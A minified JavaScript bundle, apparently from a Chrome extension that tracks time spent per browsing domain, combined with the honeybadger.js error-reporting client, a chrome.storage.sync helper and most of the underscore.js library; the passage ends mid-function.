function setDefaults() { localStorage.blacklist || (localStorage.blacklist = JSON.stringify(["example.com"])), localStorage.num_days || (localStorage.num_days = 1), localStorage.date || (localStorage.date = (new Date).toLocaleDateString()), localStorage.domains || (localStorage.domains = JSON.stringify({})), localStorage.total || (localStorage.total = JSON.stringify({ today: 0, yesterday: 0, thisweek: 0, prevweek: 0, all: 0 })), localStorage.chart_limit || (localStorage.chart_limit = 7), localStorage.other || (localStorage.other = JSON.stringify({ today: 0, yesterday: 0, thisweek: 0, prevweek: 0, all: 0 })) }

function combineEntries(t) {
    var e = JSON.parse(localStorage.domains),
        n = JSON.parse(localStorage.other);
    if (!(Object.keys(e).length <= t)) {
        var r = [];
        for (var o in e) {
            var i = JSON.parse(localStorage[o]);
            r.push({ domain: o, all: i.all }) }
        r.sort(function(t, e) {
            return e.all - t.all });
        for (var a = t; a < r.length; a++) { n.all += r[a].all;
            var o = r[a].domain;
            delete localStorage[o], delete e[o] }
        localStorage.other = JSON.stringify(n), localStorage.domains = JSON.stringify(e) } }

function checkDate() {
    var t = (new Date).toLocaleDateString();
    console.log(t);
    var e = localStorage.date;
    if (e !== t) {
        var n = JSON.parse(localStorage.domains);
        for (var r in n) {
            var o = JSON.parse(localStorage[r]);
            o.yesterday = o.today, o.today = 0, 1 === (new Date).getDay() && (o.prevweek = o.thisweek, o.thisweek = 0), localStorage[r] = JSON.stringify(o) }
        var i = JSON.parse(localStorage.total);
        i.yesterday = i.today, i.today = 0, 1 === (new Date).getDay() && (i.prevweek = i.thisweek, i.thisweek = 0), localStorage.total = JSON.stringify(i), combineEntries(500), localStorage.num_days = parseInt(localStorage.num_days) + 1, localStorage.date = t } }

function extractDomain(t) {
    var e = /:\/\/(www\.)?(.+?)\//;
    return t.match(e)[2] }

function inBlacklist(t) {
    if (!t.match(/^http/)) return !0;
    for (var e = JSON.parse(localStorage.blacklist), n = 0; n < e.length; n++)
        if (t.match(e[n])) return !0;
    return !1 }

function updateData() { chrome.windows.getLastFocused(function(t) { void 0 !== t && t.focused && chrome.idle.queryState(30, function(t) { "active" === t && chrome.tabs.getSelected(null, function(t) {
                if (void 0 !== t)
                    if (checkDate(), inBlacklist(t.url)) chrome.browserAction.setBadgeText({ text: "" });
                    else {
                        var e = extractDomain(t.url),
                            n = JSON.parse(localStorage.domains);
                        e in n || (n[e] = 1, localStorage.domains = JSON.stringify(n));
                        var r;
                        r = localStorage[e] ? JSON.parse(localStorage[e]) : { today: 0, yesterday: 0, thisweek: 0, prevweek: 0, all: 0 }, r.today += UPDATE_INTERVAL, r.thisweek += UPDATE_INTERVAL, r.all += UPDATE_INTERVAL, localStorage[e] = JSON.stringify(r);
                        var o = JSON.parse(localStorage.total);
                        o.today += UPDATE_INTERVAL, o.thisweek += UPDATE_INTERVAL, o.all += UPDATE_INTERVAL, localStorage.total = JSON.stringify(o);
                        var i = Math.floor(r.today / 60).toString();
                        i.length < 4 && (i += "m"), chrome.browserAction.setBadgeText({ text: i }) } }) }) }) }! function(t) {
    var e;
    e = function() {
        function e(t) {
            var e, n, r;
            null == t && (t = {}), r = this.constructor.defaults;
            for (e in r) n = r[e], this[e] = n;
            for (e in t) n = t[e], this[e] = n }
        return e.defaults = { api_key: null, host: "api.honeybadger.io", ssl: !0, project_root: t.location.protocol + "//" + t.location.host, environment: "production", component: null, action: null, disabled: !1, onerror: !1, debug: !1, timeout: !1 }, e.prototype.reset = function() {
            var t, e, n;
            n = this.constructor.defaults;
            for (t in n) e = n[t], this[t] = e;
            return this }, e }();
    var n;
    n = function() {
        function t(t) {
            var e, n, r, i, a, c;
            this.options = null != t ? t : {}, this.error = this.options.error, this.stack = this._stackTrace(this.error), this["class"] = null != (r = this.error) ? r.name : void 0, this.message = null != (i = this.error) ? i.message : void 0, this.source = null, this.url = document.URL, this.project_root = o.configuration.project_root, this.environment = o.configuration.environment, this.component = o.configuration.component, this.action = o.configuration.action, this.cgi_data = this._cgiData(), this.context = {}, a = o.context;
            for (e in a) n = a[e], this.context[e] = n;
            if (this.options.context && "object" == typeof this.options.context) { c = this.options.context;
                for (e in c) n = c[e], this.context[e] = n } }
        return t.prototype.payload = function() {
            return { notifier: { name: "honeybadger.js", url: "https://github.com/honeybadger-io/honeybadger-js", version: o.version, language: "javascript" }, error: { "class": this["class"], message: this.message, backtrace: this.stack, source: this.source }, request: { url: this.url, component: this.component, action: this.action, context: this.context, cgi_data: this.cgi_data }, server: { project_root: this.project_root, environment_name: this.environment } } }, t.prototype._stackTrace = function(t) {
            return (null != t ? t.stacktrace : void 0) || (null != t ? t.stack : void 0) || null }, t.prototype._cgiData = function() {
            var t, e, n;
            if (t = {}, "undefined" != typeof navigator && null !== navigator) {
                for (e in navigator) n = navigator[e], null != e && null != n && "object" != typeof n && (t[e.replace(/(?=[A-Z][a-z]*)/g, "_").toUpperCase()] = n);
                t.HTTP_USER_AGENT = t.USER_AGENT, delete t.USER_AGENT }
            return document.referrer.match(/\S/) && (t.HTTP_REFERER = document.referrer), t }, t }();
    var r, o, i, a, c, u, s = function(t, e) {
            return function() {
                return t.apply(e, arguments) } },
        l = {}.hasOwnProperty,
        f = function(t, e) {
            function n() { this.constructor = t }
            for (var r in e) l.call(e, r) && (t[r] = e[r]);
            return n.prototype = e.prototype, t.prototype = new n, t.__super__ = e.prototype, t };
    u = [null, null], a = u[0], c = u[1], r = function() {
        function r(t) { this._windowOnErrorHandler = s(this._windowOnErrorHandler, this), this._domReady = s(this._domReady, this), this.log("Initializing honeybadger.js " + this.version), t && this.configure(t) }
        return r.prototype.version = "0.1.2", r.prototype.log = function() {
            return this.log.history = this.log.history || [], this.log.history.push(arguments), this.configuration.debug && t.console ? console.log(Array.prototype.slice.call(arguments)) : void 0 }, r.prototype.configure = function(e) {
            var n, r, o, i, a, c;
            null == e && (e = {});
            for (r in e) o = e[r], this.configuration[r] = o;
            if (!this._configured && this.configuration.debug && t.console)
                for (c = this.log.history, i = 0, a = c.length; a > i; i++) n = c[i], console.log(Array.prototype.slice.call(n));
            return this._configured = !0, this }, r.prototype.configuration = new e, r.prototype.context = {}, r.prototype.resetContext = function(t) {
            return null == t && (t = {}), this.context = t instanceof Object ? t : {}, this }, r.prototype.setContext = function(t) {
            var e, n;
            if (null == t && (t = {}), t instanceof Object)
                for (e in t) n = t[e], this.context[e] = n;
            return this }, r.prototype.beforeNotifyHandlers = [], r.prototype.beforeNotify = function(t) {
            return this.beforeNotifyHandlers.push(t) }, r.prototype.notify = function(e, r) {
            var o, i, u, s, f, h, p, d;
            if (null == r && (r = {}), !this._validConfig() || this.configuration.disabled === !0) return !1;
            if (e instanceof Error) r.error = e;
            else if ("string" == typeof e) r.error = new Error(e);
            else if (e instanceof Object)
                for (i in e) s = e[i], r[i] = s;
            if (c) {
                if (r.error === a) return;
                this._loaded && this._send(c) }
            if (0 === function() {
                    var t;
                    t = [];
                    for (i in r) l.call(r, i) && t.push(i);
                    return t }().length) return !1;
            for (u = new n(r), p = this.beforeNotifyHandlers, f = 0, h = p.length; h > f; f++)
                if (o = p[f], o(u) === !1) return !1;
            return d = [r.error, u], a = d[0], c = d[1], this._loaded ? (this.log("Defering notice", u), t.setTimeout(function(t) {
                return function() {
                    return r.error === a ? t._send(u) : void 0 } }(this))) : (this.log("Queuing notice", u), this._queue.push(u)), u }, r.prototype.wrap = function(t) {
            var e;
            return e = function() {
                var e;
                try {
                    return t.apply(this, arguments) } catch (n) {
                    throw e = n, o.notify(e), e } } }, r.prototype.reset = function() {
            return this.resetContext(), this.configuration.reset(), this._configured = !1, this }, r.prototype.install = function() {
            return this.installed !== !0 ? (t.onerror !== this._windowOnErrorHandler && (this.log("Installing window.onerror handler"), this._oldOnErrorHandler = t.onerror, t.onerror = this._windowOnErrorHandler), this._loaded ? this.log("honeybadger.js " + this.version + " ready") : (this.log("Installing ready handler"), document.addEventListener ? (document.addEventListener("DOMContentLoaded", this._domReady, !0), t.addEventListener("load", this._domReady, !0)) : t.attachEvent("onload", this._domReady)), this._installed = !0, this) : void 0 }, r.prototype._queue = [], r.prototype._loaded = "complete" === document.readyState, r.prototype._configured = !1, r.prototype._domReady = function() {
            var t, e;
            if (!this._loaded) {
                for (this._loaded = !0, this.log("honeybadger.js " + this.version + " ready"), e = []; t = this._queue.pop();) e.push(this._send(t));
                return e } }, r.prototype._send = function(t) {
            var e;
            return this.log("Sending notice", t), e = [null, null], a = e[0], c = e[1], this._sendRequest(t.payload()) }, r.prototype._validConfig = function() {
            var t;
            return this._configured ? !(null != (t = this.configuration.api_key) ? !t.match(/\S/) : !0) : !1 }, r.prototype._sendRequest = function(t) {
            var e;
            return e = "http" + (this.configuration.ssl && "s" || "") + "://" + this.configuration.host + "/v1/notices.gif", this._request(e, t) }, r.prototype._request = function(e, n) {
            var r, o, i;
            return i = [new Image, null], r = i[0], o = i[1], r.onabort = r.onerror = function(r) {
                return function() {
                    return o && t.clearTimeout(o), r.log("Request failed.", e, n) } }(this), r.onload = function(e) {
                return function() {
                    return o ? t.clearTimeout(o) : void 0 } }(this), r.src = e + "?" + this._serialize({ api_key: this.configuration.api_key, notice: n, t: (new Date).getTime() }), this.configuration.timeout && (o = t.setTimeout(function(t) {
                return function() {
                    return r.src = "", t.log("Request timed out.", e, n) } }(this), this.configuration.timeout)), !0 }, r.prototype._serialize = function(t, e) {
            var n, r, o, i;
            o = [];
            for (n in t) i = t[n], t.hasOwnProperty(n) && null != n && null != i && (r = e ? e + "[" + n + "]" : n, o.push("object" == typeof i ? this._serialize(i, r) : encodeURIComponent(r) + "=" + encodeURIComponent(i)));
            return o.join("&") }, r.prototype._windowOnErrorHandler = function(t, e, n, r, o) {
            return !c && this.configuration.onerror && (this.log("Error caught by window.onerror", t, e, n, r, o), o || (o = new i(t, e, n, r)), this.notify(o)), this._oldOnErrorHandler ? this._oldOnErrorHandler.apply(this, arguments) : !1 }, r }(), i = function(t) {
        function e(t, e, n, r) { this.name = "UncaughtError", this.message = t || "An unknown error was caught by window.onerror.", this.stack = [this.message, "\n    at ? (", e || "unknown", ":", n || 0, ":", r || 0, ")"].join("") }
        return f(e, t), e }(Error), o = new r, o.Client = r, t.Honeybadger = o, o.install() }(window),
function() {
    var t, e = function(e, n, r) {
            if (t.runtime.lastError) { t.runtime.lastError.message } "undefined" != typeof r && r(n) },
        n = function(e) { "undefined" == typeof e && (e = {}), t = e.chrome || chrome };
    n.prototype.save = function(n, r) { t.storage.sync.set(n, function(t) { e("Set", t, r) }) }, n.prototype.remove = function(n, r) { t.storage.sync.remove(n, function(t) { e("Remove", t, r) }) }, n.prototype.get = function(n, r) { t.storage.sync.get(n, function(t) { e("Get", t, r) }) }, "undefined" != typeof module && module.exports ? module.exports = n : window.ChromeSync = n }(),
function() {
    var t = this,
        e = t._,
        n = Array.prototype,
        r = Object.prototype,
        o = Function.prototype,
        i = n.push,
        a = n.slice,
        c = n.concat,
        u = r.toString,
        s = r.hasOwnProperty,
        l = Array.isArray,
        f = Object.keys,
        h = o.bind,
        p = function(t) {
            return t instanceof p ? t : this instanceof p ? void(this._wrapped = t) : new p(t) }; "undefined" != typeof exports ? ("undefined" != typeof module && module.exports && (exports = module.exports = p), exports._ = p) : t._ = p, p.VERSION = "1.7.0";
    var d = function(t, e, n) {
        if (void 0 === e) return t;
        switch (null == n ? 3 : n) {
            case 1:
                return function(n) {
                    return t.call(e, n) };
            case 2:
                return function(n, r) {
                    return t.call(e, n, r) };
            case 3:
                return function(n, r, o) {
                    return t.call(e, n, r, o) };
            case 4:
                return function(n, r, o, i) {
                    return t.call(e, n, r, o, i) } }
        return function() {
            return t.apply(e, arguments) } };
    p.iteratee = function(t, e, n) {
        return null == t ? p.identity : p.isFunction(t) ? d(t, e, n) : p.isObject(t) ? p.matches(t) : p.property(t) }, p.each = p.forEach = function(t, e, n) {
        if (null == t) return t;
        e = d(e, n);
        var r, o = t.length;
        if (o === +o)
            for (r = 0; o > r; r++) e(t[r], r, t);
        else {
            var i = p.keys(t);
            for (r = 0, o = i.length; o > r; r++) e(t[i[r]], i[r], t) }
        return t }, p.map = p.collect = function(t, e, n) {
        if (null == t) return [];
        e = p.iteratee(e, n);
        for (var r, o = t.length !== +t.length && p.keys(t), i = (o || t).length, a = Array(i), c = 0; i > c; c++) r = o ? o[c] : c, a[c] = e(t[r], r, t);
        return a };
    var g = "Reduce of empty array with no initial value";
    p.reduce = p.foldl = p.inject = function(t, e, n, r) { null == t && (t = []), e = d(e, r, 4);
        var o, i = t.length !== +t.length && p.keys(t),
            a = (i || t).length,
            c = 0;
        if (arguments.length < 3) {
            if (!a) throw new TypeError(g);
            n = t[i ? i[c++] : c++] }
        for (; a > c; c++) o = i ? i[c] : c, n = e(n, t[o], o, t);
        return n }, p.reduceRight = p.foldr = function(t, e, n, r) { null == t && (t = []), e = d(e, r, 4);
        var o, i = t.length !== +t.length && p.keys(t),
            a = (i || t).length;
        if (arguments.length < 3) {
            if (!a) throw new TypeError(g);
            n = t[i ? i[--a] : --a] }
        for (; a--;) o = i ? i[a] : a, n = e(n, t[o], o, t);
        return n }, p.find = p.detect = function(t, e, n) {
        var r;
        return e = p.iteratee(e, n), p.some(t, function(t, n, o) {
            return e(t, n, o) ? (r = t, !0) : void 0 }), r }, p.filter = p.select = function(t, e, n) {
        var r = [];
        return null == t ? r : (e = p.iteratee(e, n), p.each(t, function(t, n, o) { e(t, n, o) && r.push(t) }), r) }, p.reject = function(t, e, n) {
        return p.filter(t, p.negate(p.iteratee(e)), n) }, p.every = p.all = function(t, e, n) {
        if (null == t) return !0;
        e = p.iteratee(e, n);
        var r, o, i = t.length !== +t.length && p.keys(t),
            a = (i || t).length;
        for (r = 0; a > r; r++)
            if (o = i ? i[r] : r, !e(t[o], o, t)) return !1;
        return !0 }, p.some = p.any = function(t, e, n) {
        if (null == t) return !1;
        e = p.iteratee(e, n);
        var r, o, i = t.length !== +t.length && p.keys(t),
            a = (i || t).length;
        for (r = 0; a > r; r++)
            if (o = i ? i[r] : r, e(t[o], o, t)) return !0;
        return !1 }, p.contains = p.include = function(t, e) {
        return null == t ? !1 : (t.length !== +t.length && (t = p.values(t)), p.indexOf(t, e) >= 0) }, p.invoke = function(t, e) {
        var n = a.call(arguments, 2),
            r = p.isFunction(e);
        return p.map(t, function(t) {
            return (r ? e : t[e]).apply(t, n) }) }, p.pluck = function(t, e) {
        return p.map(t, p.property(e)) }, p.where = function(t, e) {
        return p.filter(t, p.matches(e)) }, p.findWhere = function(t, e) {
        return p.find(t, p.matches(e)) }, p.max = function(t, e, n) {
        var r, o, i = -1 / 0,
            a = -1 / 0;
        if (null == e && null != t) { t = t.length === +t.length ? t : p.values(t);
            for (var c = 0, u = t.length; u > c; c++) r = t[c], r > i && (i = r) } else e = p.iteratee(e, n), p.each(t, function(t, n, r) { o = e(t, n, r), (o > a || o === -1 / 0 && i === -1 / 0) && (i = t, a = o) });
        return i }, p.min = function(t, e, n) {
        var r, o, i = 1 / 0,
            a = 1 / 0;
        if (null == e && null != t) { t = t.length === +t.length ? t : p.values(t);
            for (var c = 0, u = t.length; u > c; c++) r = t[c], i > r && (i = r) } else e = p.iteratee(e, n), p.each(t, function(t, n, r) { o = e(t, n, r), (a > o || 1 / 0 === o && 1 / 0 === i) && (i = t, a = o) });
        return i }, p.shuffle = function(t) {
        for (var e, n = t && t.length === +t.length ? t : p.values(t), r = n.length, o = Array(r), i = 0; r > i; i++) e = p.random(0, i), e !== i && (o[i] = o[e]), o[e] = n[i];
        return o }, p.sample = function(t, e, n) {
        return null == e || n ? (t.length !== +t.length && (t = p.values(t)), t[p.random(t.length - 1)]) : p.shuffle(t).slice(0, Math.max(0, e)) }, p.sortBy = function(t, e, n) {
        return e = p.iteratee(e, n), p.pluck(p.map(t, function(t, n, r) {
            return { value: t, index: n, criteria: e(t, n, r) } }).sort(function(t, e) {
            var n = t.criteria,
                r = e.criteria;
            if (n !== r) {
                if (n > r || void 0 === n) return 1;
                if (r > n || void 0 === r) return -1 }
            return t.index - e.index }), "value") };
    var y = function(t) {
        return function(e, n, r) {
            var o = {};
            return n = p.iteratee(n, r), p.each(e, function(r, i) {
                var a = n(r, i, e);
                t(o, r, a) }), o } };
    p.groupBy = y(function(t, e, n) { p.has(t, n) ? t[n].push(e) : t[n] = [e] }), p.indexBy = y(function(t, e, n) { t[n] = e }), p.countBy = y(function(t, e, n) { p.has(t, n) ? t[n]++ : t[n] = 1 }), p.sortedIndex = function(t, e, n, r) { n = p.iteratee(n, r, 1);
        for (var o = n(e), i = 0, a = t.length; a > i;) {
            var c = i + a >>> 1;
            n(t[c]) < o ? i = c + 1 : a = c }
        return i }, p.toArray = function(t) {
        return t ? p.isArray(t) ? a.call(t) : t.length === +t.length ? p.map(t, p.identity) : p.values(t) : [] }, p.size = function(t) {
        return null == t ? 0 : t.length === +t.length ? t.length : p.keys(t).length }, p.partition = function(t, e, n) { e = p.iteratee(e, n);
        var r = [],
            o = [];
        return p.each(t, function(t, n, i) {
            (e(t, n, i) ? r : o).push(t) }), [r, o] }, p.first = p.head = p.take = function(t, e, n) {
        return null == t ? void 0 : null == e || n ? t[0] : 0 > e ? [] : a.call(t, 0, e) }, p.initial = function(t, e, n) {
        return a.call(t, 0, Math.max(0, t.length - (null == e || n ? 1 : e))) }, p.last = function(t, e, n) {
        return null == t ? void 0 : null == e || n ? t[t.length - 1] : a.call(t, Math.max(t.length - e, 0)) }, p.rest = p.tail = p.drop = function(t, e, n) {
        return a.call(t, null == e || n ? 1 : e) }, p.compact = function(t) {
        return p.filter(t, p.identity) };
    var m = function(t, e, n, r) {
        if (e && p.every(t, p.isArray)) return c.apply(r, t);
        for (var o = 0, a = t.length; a > o; o++) {
            var u = t[o];
            p.isArray(u) || p.isArguments(u) ? e ? i.apply(r, u) : m(u, e, n, r) : n || r.push(u) }
        return r };
    p.flatten = function(t, e) {
        return m(t, e, !1, []) }, p.without = function(t) {
        return p.difference(t, a.call(arguments, 1)) }, p.uniq = p.unique = function(t, e, n, r) {
        if (null == t) return [];
        p.isBoolean(e) || (r = n, n = e, e = !1), null != n && (n = p.iteratee(n, r));
        for (var o = [], i = [], a = 0, c = t.length; c > a; a++) {
            var u = t[a];
            if (e) a && i === u || o.push(u), i = u;
            else if (n) {
                var s = n(u, a, t);
                p.indexOf(i, s) < 0 && (i.push(s), o.push(u)) } else p.indexOf(o, u) < 0 && o.push(u) }
        return o }, p.union = function() {
        return p.uniq(m(arguments, !0, !0, [])) }, p.intersection = function(t) {
        if (null == t) return [];
        for (var e = [], n = arguments.length, r = 0, o = t.length; o > r; r++) {
            var i = t[r];
            if (!p.contains(e, i)) {
                for (var a = 1; n > a && p.contains(arguments[a], i); a++);
                a === n && e.push(i) } }
        return e }, p.difference = function(t) {
        var e = m(a.call(arguments, 1), !0, !0, []);
        return p.filter(t, function(t) {
            return !p.contains(e, t) }) }, p.zip = function(t) {
        if (null == t) return [];
        for (var e = p.max(arguments, "length").length, n = Array(e), r = 0; e > r; r++) n[r] = p.pluck(arguments, r);
        return n }, p.object = function(t, e) {
        if (null == t) return {};
        for (var n = {}, r = 0, o = t.length; o > r; r++) e ? n[t[r]] = e[r] : n[t[r][0]] = t[r][1];
        return n }, p.indexOf = function(t, e, n) {
        if (null == t) return -1;
        var r = 0,
            o = t.length;
        if (n) {
            if ("number" != typeof n) return r = p.sortedIndex(t, e), t[r] === e ? r : -1;
            r = 0 > n ? Math.max(0, o + n) : n }
        for (; o > r; r++)
            if (t[r] === e) return r;
        return -1 }, p.lastIndexOf = function(t, e, n) {
        if (null == t) return -1;
        var r = t.length;
        for ("number" == typeof n && (r = 0 > n ? r + n + 1 : Math.min(r, n + 1)); --r >= 0;)
            if (t[r] === e) return r;
        return -1 }, p.range = function(t, e, n) { arguments.length <= 1 && (e = t || 0, t = 0), n = n || 1;
        for (var r = Math.max(Math.ceil((e - t) / n), 0), o = Array(r), i = 0; r > i; i++, t += n) o[i] = t;
        return o };
    var v = function() {};
    p.bind = function(t, e) {
        var n, r;
        if (h && t.bind === h) return h.apply(t, a.call(arguments, 1));
        if (!p.isFunction(t)) throw new TypeError("Bind must be called on a function");
        return n = a.call(arguments, 2), r = function() {
            if (!(this instanceof r)) return t.apply(e, n.concat(a.call(arguments)));
            v.prototype = t.prototype;
            var o = new v;
            v.prototype = null;
            var i = t.apply(o, n.concat(a.call(arguments)));
            return p.isObject(i) ? i : o } }, p.partial = function(t) {
        var e = a.call(arguments, 1);
        return function() {
            for (var n = 0, r = e.slice(), o = 0, i = r.length; i > o; o++) r[o] === p && (r[o] = arguments[n++]);
            for (; n < arguments.length;) r.push(arguments[n++]);
            return t.apply(this, r) } }, p.bindAll = function(t) {
        var e, n, r = arguments.length;
        if (1 >= r) throw new Error("bindAll must be passed function names");
        for (e = 1; r > e; e++) n = arguments[e], t[n] = p.bind(t[n], t);
        return t }, p.memoize = function(t, e) {
        var n = function(r) {
            var o = n.cache,
                i = e ? e.apply(this, arguments) : r;
            return p.has(o, i) || (o[i] = t.apply(this, arguments)), o[i] };
        return n.cache = {}, n }, p.delay = function(t, e) {
        var n = a.call(arguments, 2);
        return setTimeout(function() {
            return t.apply(null, n) }, e) }, p.defer = function(t) {
        return p.delay.apply(p, [t, 1].concat(a.call(arguments, 1))) }, p.throttle = function(t, e, n) {
        var r, o, i, a = null,
            c = 0;
        n || (n = {});
        var u = function() { c = n.leading === !1 ? 0 : p.now(), a = null, i = t.apply(r, o), a || (r = o = null) };
        return function() {
            var s = p.now();
            c || n.leading !== !1 || (c = s);
            var l = e - (s - c);
            return r = this, o = arguments, 0 >= l || l > e ? (clearTimeout(a), a = null, c = s, i = t.apply(r, o), a || (r = o = null)) : a || n.trailing === !1 || (a = setTimeout(u, l)), i } }, p.debounce = function(t, e, n) {
        var r, o, i, a, c, u = function() {
            var s = p.now() - a;
            e > s && s > 0 ? r = setTimeout(u, e - s) : (r = null, n || (c = t.apply(i, o), r || (i = o = null))) };
        return function() { i = this, o = arguments, a = p.now();
            var s = n && !r;
            return r || (r = setTimeout(u, e)), s && (c = t.apply(i, o), i = o = null), c } }, p.wrap = function(t, e) {
        return p.partial(e, t) }, p.negate = function(t) {
        return function() {
            return !t.apply(this, arguments) } }, p.compose = function() {
        var t = arguments,
            e = t.length - 1;
        return function() {
            for (var n = e, r = t[e].apply(this, arguments); n--;) r = t[n].call(this, r);
            return r } }, p.after = function(t, e) {
        return function() {
            return --t < 1 ? e.apply(this, arguments) : void 0 } }, p.before = function(t, e) {
        var n;
        return function() {
            return --t > 0 ? n = e.apply(this, arguments) : e = null, n } }, p.once = p.partial(p.before, 2), p.keys = function(t) {
        if (!p.isObject(t)) return [];
        if (f) return f(t);
        var e = [];
        for (var n in t) p.has(t, n) && e.push(n);
        return e }, p.values = function(t) {
        for (var e = p.keys(t), n = e.length, r = Array(n), o = 0; n > o; o++) r[o] = t[e[o]];
        return r }, p.pairs = function(t) {
        for (var e = p.keys(t), n = e.length, r = Array(n), o = 0; n > o; o++) r[o] = [e[o], t[e[o]]];
        return r }, p.invert = function(t) {
        for (var e = {}, n = p.keys(t), r = 0, o = n.length; o > r; r++) e[t[n[r]]] = n[r];
        return e }, p.functions = p.methods = function(t) {
        var e = [];
        for (var n in t) p.isFunction(t[n]) && e.push(n);
        return e.sort() }, p.extend = function(t) {
        if (!p.isObject(t)) return t;
        for (var e, n, r = 1, o = arguments.length; o > r; r++) { e = arguments[r];
            for (n in e) s.call(e, n) && (t[n] = e[n]) }
        return t }, p.pick = function(t, e, n) {
        var r, o = {};
        if (null == t) return o;
        if (p.isFunction(e)) { e = d(e, n);
            for (r in t) {
                var i = t[r];
                e(i, r, t) && (o[r] = i) } } else {
            var u = c.apply([], a.call(arguments, 1));
            t = new Object(t);
            for (var s = 0, l = u.length; l > s; s++) r = u[s], r in t && (o[r] = t[r]) }
        return o }, p.omit = function(t, e, n) {
        if (p.isFunction(e)) e = p.negate(e);
        else {
            var r = p.map(c.apply([], a.call(arguments, 1)), String);
            e = function(t, e) {
                return !p.contains(r, e) } }
        return p.pick(t, e, n) }, p.defaults = function(t) {
        if (!p.isObject(t)) return t;
        for (var e = 1, n = arguments.length; n > e; e++) {
            var r = arguments[e];
            for (var o in r) void 0 === t[o] && (t[o] = r[o]) }
        return t }, p.clone = function(t) {
        return p.isObject(t) ? p.isArray(t) ? t.slice() : p.extend({}, t) : t }, p.tap = function(t, e) {
        return e(t), t };
    var w = function(t, e, n, r) {
        if (t === e) return 0 !== t || 1 / t === 1 / e;
        if (null == t || null == e) return t === e;
        t instanceof p && (t = t._wrapped), e instanceof p && (e = e._wrapped);
        var o = u.call(t);
        if (o !== u.call(e)) return !1;
        switch (o) {
            case "[object RegExp]":
            case "[object String]":
                return "" + t == "" + e;
            case "[object Number]":
                return +t !== +t ? +e !== +e : 0 === +t ? 1 / +t === 1 / e : +t === +e;
            case "[object Date]":
            case "[object Boolean]":
                return +t === +e }
        if ("object" != typeof t || "object" != typeof e) return !1;
        for (var i = n.length; i--;)
            if (n[i] === t) return r[i] === e;
        var a = t.constructor,
            c = e.constructor;
        if (a !== c && "constructor" in t && "constructor" in e && !(p.isFunction(a) && a instanceof a && p.isFunction(c) && c instanceof c)) return !1;
        n.push(t), r.push(e);
        var s, l;
        if ("[object Array]" === o) {
            if (s = t.length, l = s === e.length)
                for (; s-- && (l = w(t[s], e[s], n, r));); } else {
            var f, h = p.keys(t);
            if (s = h.length, l = p.keys(e).length === s)
                for (; s-- && (f = h[s], l = p.has(e, f) && w(t[f], e[f], n, r));); }
        return n.pop(), r.pop(), l };
    p.isEqual = function(t, e) {
        return w(t, e, [], []) }, p.isEmpty = function(t) {
        if (null == t) return !0;
        if (p.isArray(t) || p.isString(t) || p.isArguments(t)) return 0 === t.length;
        for (var e in t)
            if (p.has(t, e)) return !1;
        return !0 }, p.isElement = function(t) {
        return !(!t || 1 !== t.nodeType) }, p.isArray = l || function(t) {
        return "[object Array]" === u.call(t) }, p.isObject = function(t) {
        var e = typeof t;
        return "function" === e || "object" === e && !!t }, p.each(["Arguments", "Function", "String", "Number", "Date", "RegExp"], function(t) { p["is" + t] = function(e) {
            return u.call(e) === "[object " + t + "]" } }), p.isArguments(arguments) || (p.isArguments = function(t) {
        return p.has(t, "callee") }), "function" != typeof /./ && (p.isFunction = function(t) {
        return "function" == typeof t || !1 }), p.isFinite = function(t) {
        return isFinite(t) && !isNaN(parseFloat(t)) }, p.isNaN = function(t) {
        return p.isNumber(t) && t !== +t }, p.isBoolean = function(t) {
        return t === !0 || t === !1 || "[object Boolean]" === u.call(t) }, p.isNull = function(t) {
        return null === t }, p.isUndefined = function(t) {
        return void 0 === t }, p.has = function(t, e) {
        return null != t && s.call(t, e) }, p.noConflict = function() {
        return t._ = e, this }, p.identity = function(t) {
        return t }, p.constant = function(t) {
        return function() {
            return t } }, p.noop = function() {}, p.property = function(t) {
        return function(e) {
            return e[t] } }, p.matches = function(t) {
        var e = p.pairs(t),
            n = e.length;
        return function(t) {
            if (null == t) return !n;
            t = new Object(t);
            for (var r = 0; n > r; r++) {
                var o = e[r],
                    i = o[0];
                if (o[1] !== t[i] || !(i in t)) return !1 }
            return !0 } }, p.times = function(t, e, n) {
        var r = Array(Math.max(0, t));
        e = d(e, n, 1);
        for (var o = 0; t > o; o++) r[o] = e(o);
        return r }, p.random = function(t, e) {
        return null == e && (e = t, t = 0), t + Math.floor(Math.random() * (e - t + 1)) }, p.now = Date.now || function() {
        return (new Date).getTime() };
    var _ = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;", "`": "&#x60;" },
        x = p.invert(_),
        b = function(t) {
            var e = function(e) {
                    return t[e] },
                n = "(?:" + p.keys(t).join("|") + ")",
                r = RegExp(n),
                o = RegExp(n, "g");
            return function(t) {
                return t = null == t ? "" : "" + t, r.test(t) ? t.replace(o, e) : t } };
    p.escape = b(_), p.unescape = b(x), p.result = function(t, e) {
        if (null != t) {
            var n = t[e];
            return p.isFunction(n) ? t[e]() : n } };
    var S = 0;
    p.uniqueId = function(t) {
        var e = ++S + "";
        return t ? t + e : e }, p.templateSettings = { evaluate: /<%([\s\S]+?)%>/g, interpolate: /<%=([\s\S]+?)%>/g, escape: /<%-([\s\S]+?)%>/g };
    var A = /(.)^/,
        k = { "'": "'", "\\": "\\", "\r": "r", "\n": "n", "\u2028": "u2028", "\u2029": "u2029" },
        T = /\\|'|\r|\n|\u2028|\u2029/g,
        E = function(t) {
            return "\\" + k[t] };
    p.template = function(t, e, n) {!e && n && (e = n), e = p.defaults({}, e, p.templateSettings);
        var r = RegExp([(e.escape || A).source, (e.interpolate || A).source, (e.evaluate || A).source].join("|") + "|$", "g"),
            o = 0,
            i = "__p+='";
        t.replace(r, function(e, n, r, a, c) {
            return i += t.slice(o, c).replace(T, E), o = c + e.length, n ? i += "'+\n((__t=(" + n + "))==null?'':_.escape(__t))+\n'" : r ? i += "'+\n((__t=(" + r + "))==null?'':__t)+\n'" : a && (i += "';\n" + a + "\n__p+='"), e }), i += "';\n", e.variable || (i = "with(obj||{}){\n" + i + "}\n"), i = "var __t,__p='',__j=Array.prototype.join,print=function(){__p+=__j.call(arguments,'');};\n" + i + "return __p;\n";
        try {
            var a = new Function(e.variable || "obj", "_", i) } catch (c) {
            throw c.source = i, c }
        var u = function(t) {
                return a.call(this, t, p) },
            s = e.variable || "obj";
        return u.source = "function(" + s + "){\n" + i + "}", u }, p.chain = function(t) {
        var e = p(t);
        return e._chain = !0, e };
    var C = function(t) {
        return this._chain ? p(t).chain() : t };
    p.mixin = function(t) { p.each(p.functions(t), function(e) {
            var n = p[e] = t[e];
            p.prototype[e] = function() {
                var t = [this._wrapped];
